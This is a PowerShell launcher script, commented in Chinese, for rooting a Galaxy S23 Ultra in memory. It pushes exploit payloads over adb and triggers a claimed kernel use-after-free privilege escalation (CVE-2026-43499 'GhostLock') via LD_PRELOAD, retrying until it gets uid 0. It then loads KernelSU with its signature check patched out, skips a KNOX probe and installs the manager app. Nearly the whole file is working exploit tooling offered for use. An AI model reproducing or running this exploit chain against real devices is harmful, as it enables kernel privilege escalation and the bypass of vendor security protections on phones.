# =============================================================================
#  s9180-root-kit-zcs  — Galaxy S23 Ultra (SM-S9180/dm3q / S9180ZCS8FZG1)
#  内存态 root + KernelSU（签名授权已去除，KNOX 探针已跳过）
#  CVE-2026-43499 (GhostLock) 内核 UAF 提权
#
#  用法：
#    .\run_root_dm3q.ps1                完整流程
#    .\run_root_dm3q.ps1 --verify       只检查设备状态
#    .\run_root_dm3q.ps1 --skip-push    跳过推送
#    .\run_root_dm3q.ps1 --no-app       不装 KernelSU Manager
#    .\run_root_dm3q.ps1 -Attempts 3    重试 3 次
#
#  补丁：
#    payload @ 0x9480: b.ne -> nop
#    root    @ 0x22bc: b.ne -> nop
#    root    @ 0x2304: b.ne -> nop
#    grku Ed25519 签名授权已去除，保留 kernel-access 自校验
# =============================================================================

param(
    [switch]$SkipPush,
    [switch]$NoApp,
    [switch]$Verify,
    [int]$Attempts = 1
)

$ErrorActionPreference = "Continue"

$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$Payload   = "$ScriptDir\payloads\dm3q-S9180ZCS8FZG1__payload"
$RootHelper= "$ScriptDir\payloads\dm3q-S9180ZCS8FZG1__root"
$Ksud      = "$ScriptDir\tools\ksud-samsung-android13-5.15-kdp"
$Apk       = "$ScriptDir\tools\KernelSU_Manager_v3.2.5_32525.apk"

$DevPayload  = "/data/local/tmp/cve-2026-43499"
$DevRoot     = "/data/local/tmp/cve-2026-43499-root"
$DevKsud     = "/data/local/tmp/ksud-selected"
$WarmupIters = 400
$TargetFW    = "S9180ZCS8FZG1"

# --- logging ---
$LogDir = "$ScriptDir\logs"
if (-not (Test-Path $LogDir)) { New-Item -ItemType Directory -Path $LogDir -Force | Out-Null }
$TS  = Get-Date -Format "yyyyMMdd_HHmmss"
$Log = "$LogDir\run_$TS.log"

function log($lvl,$msg) {
    $s = "[$(Get-Date -Format 'HH:mm:ss')][$lvl] $msg"
    Add-Content $Log $s
    switch ($lvl) {
        "ERR"  { Write-Host $s -ForegroundColor Red }
        "WARN" { Write-Host $s -ForegroundColor Yellow }
        "OK"   { Write-Host $s -ForegroundColor Green }
        "STAGE"{ Write-Host $s -ForegroundColor Cyan }
        default{ Write-Host $s }
    }
}

# --- adb ---
function find-adb {
    if ($env:ADB_BIN -and (Test-Path $env:ADB_BIN)) { return $env:ADB_BIN }
    $b = "$ScriptDir\adb-bin\adb.exe"
    if (Test-Path $b) { return $b }
    return (Get-Command adb -ErrorAction SilentlyContinue).Source
}
function adb-run($a) {
    log "ADB" "$a"
    $o = & $Adb @a 2>&1
    $r = $LASTEXITCODE
    if ($r -ne 0) { log "ERR" "adb rc=$r" }
    Add-Content $Log "[$(Get-Date -Format 'HH:mm:ss')][OUT] $o"
    return @{Out=$o; Rc=$r}
}

# ==== main ====
Write-Host "============================================================" -Fo Cyan
Write-Host "  s9180-root-kit-zcs  Galaxy S23 Ultra (SM-S9180 / $TargetFW)" -Fo Cyan
Write-Host "  CVE-2026-43499 GhostLock (sig check removed)" -Fo Cyan
Write-Host "  log: $Log" -Fo Cyan
Write-Host "============================================================" -Fo Cyan

$Adb = find-adb
if (-not $Adb) { log "ERR" "adb not found"; exit 1 }
log "OK" "adb=$Adb"

$s = (& $Adb get-state 2>&1 | Out-String).Trim()
if ($s -ne "device") { log "ERR" "device state=$s"; exit 1 }
log "OK" "device connected"

$k = (& $Adb shell "uname -r" 2>&1 | Out-String).Trim()
$fp = (& $Adb shell "getprop ro.build.fingerprint" 2>&1 | Out-String).Trim()
log "INFO" "kernel=$k"
log "INFO" "fingerprint=$fp"
Write-Host "kernel: $k"
Write-Host "fingerprint: $fp"

if ($fp -notmatch $TargetFW) {
    log "WARN" "firmware mismatch"
    if ((Read-Host "force? (YES)") -ne "YES") { exit 1 }
}

log "WARN" "KNOX probe SKIPPED (per user request). e-fuse risk is yours."

if ($Verify) {
    log "STAGE" "verify mode"
    $r=adb-run @("shell","ls -l $DevPayload $DevRoot $DevKsud 2>&1"); Write-Host $r.Out
    $m=(& $Adb shell "cat /proc/modules" 2>&1|Out-String)
    if ($m -match "kernelsu"){log "OK" "kernelsu loaded"}else{log "WARN" "not loaded"}
    exit 0
}

if (-not $SkipPush) {
    log "STAGE" "pushing files"
    foreach($f in @($Payload,$RootHelper,$Ksud)){if(-not(Test-Path $f)){log "ERR" "missing $f";exit 1}}
    if ((adb-run @("push",$Payload,$DevPayload)).Rc -ne 0){log "ERR" "push fail";exit 1}
    if ((adb-run @("push",$RootHelper,$DevRoot)).Rc -ne 0){log "ERR" "push fail";exit 1}
    if ((adb-run @("push",$Ksud,$DevKsud)).Rc -ne 0){log "ERR" "push fail";exit 1}
    $null=adb-run @("shell","chmod 755 $DevPayload $DevRoot $DevKsud")
    log "OK" "files pushed"
}

log "STAGE" "warmup x$WarmupIters"
$null = & $Adb shell "i=0;while [ `$i -lt $WarmupIters ];do /system/bin/true;i=`$((i+1));done" 2>&1

log "STAGE" "exploit (attempts=$Attempts)"
Write-Host "device may reboot - normal" -Fo Yellow
$ok=$false
for($i=1;$i -le 3;$i++){
    log "STAGE" "attempt $i/3"
    $null=& $Adb wait-for-device 2>&1; Start-Sleep 2
    $cmd="CVE43499_ROOT_HELPER=$DevRoot EXPLOIT_ATTEMPTS=$Attempts LD_PRELOAD=$DevPayload /system/bin/true"
    $o=(& $Adb shell $cmd 2>&1|Out-String)
    Add-Content $Log "[$(Get-Date -Format 'HH:mm:ss')][OUT] $o"
    $o -split "`n"|Select-String "stage=|attempt|root|fail|error|uid=|temporary" -AllMatches|Select -First 12|%{log "INFO" "> $($_.Line.Trim())"}
    if($o -match "temporary-root-ready"){$ok=$true;log "OK" "temporary-root-ready";break}
    $id=(& $Adb exec-out "$DevRoot" "-c" "/system/bin/id" 2>&1|Out-String)
    if($id -match "uid=0\(root\)"){$ok=$true;log "OK" "uid=0(root)";break}
    if($i -lt 3){log "WARN" "retry in 3s";Start-Sleep 3}
}
if(-not $ok){
    log "ERR" "no root. reboot & rerun. check E101 in log."
    exit 1
}

log "STAGE" "root obtained"
$r=adb-run @("exec-out",$DevRoot,"-c","/system/bin/id");Write-Host $r.Out

log "STAGE" "KernelSU late-load"
$null=adb-run @("shell","$DevRoot --late-load")
Start-Sleep 2
$m=(& $Adb shell "cat /proc/modules" 2>&1|Out-String)
if($m -match "kernelsu"){log "OK" "kernelsu loaded";$m -split "`n"|Select-String "kernelsu"|%{Write-Host $_.Line}}
else{log "ERR" "kernelsu not loaded"}

if(-not $NoApp){
    log "STAGE" "installing Manager App"
    if((adb-run @("install","-r",$Apk)).Rc -eq 0){
        log "OK" "installed";$null=& $Adb shell "am start -n me.weishu.kernelsu/.ui.MainActivity" 2>&1
    }else{log "WARN" "app install failed"}
}

Write-Host "`n============================================================" -Fo Cyan
Write-Host "  done. memory root - reboot clears, rerun to re-root." -Fo Green
Write-Host "============================================================" -Fo Cyan
log "OK" "done"
